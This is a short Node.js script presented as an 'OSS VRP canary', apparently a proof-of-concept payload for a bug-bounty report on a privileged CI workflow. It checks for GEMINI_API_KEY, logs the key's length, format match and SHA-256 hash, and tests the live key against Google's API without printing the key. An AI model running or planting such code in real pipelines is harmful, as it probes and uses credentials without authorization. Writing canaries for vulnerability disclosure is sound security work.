/**
 * OSS VRP canary. Fingerprints whether GEMINI_API_KEY is present in this
 * privileged workflow job. Does not print or exfiltrate the secret.
 */
import crypto from 'node:crypto';
import https from 'node:https';

const k = process.env.GEMINI_API_KEY || '';
const sha = crypto.createHash('sha256').update(k).digest('hex');
const looksGoogle = /^AIza[0-9A-Za-z_-]{20,}$/.test(k);

console.log('R00P_CANARY_KEY_PRESENT=' + (k.length > 0));
console.log('R00P_CANARY_KEY_LEN=' + k.length);
console.log('R00P_CANARY_LOOKS_GOOGLE_API_KEY=' + looksGoogle);
console.log('R00P_CANARY_SHA256=' + sha);

function finish(httpCode) {
  console.log('R00P_CANARY_GOOGLE_API_HTTP=' + httpCode);
  process.exit(k.length > 0 ? 0 : 1);
}

if (!k) {
  finish('no_key');
} else {
  const req = https.request(
    {
      hostname: 'generativelanguage.googleapis.com',
      path: '/v1beta/models?key=' + encodeURIComponent(k),
      method: 'GET',
    },
    (res) => {
      res.resume();
      finish(String(res.statusCode));
    },
  );
  req.on('error', () => finish('error'));
  req.end();
}
